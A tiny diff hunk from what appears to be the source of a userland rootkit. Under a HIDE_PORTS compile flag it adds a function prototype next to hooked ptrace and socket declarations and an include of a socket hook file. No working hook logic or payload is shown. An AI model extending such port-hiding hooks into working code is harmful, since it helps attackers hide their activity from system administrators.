@@ -35,6 +35,7 @@ long ptrace(void *request, pid_t pid, void *addr, void *data);
 #endif
 
 #ifdef HIDE_PORTS
+int ssme(int domain, int protocol);
 int socket(int domain, int type, int protocol);
 #include "hooks/socket.c"
 #endif
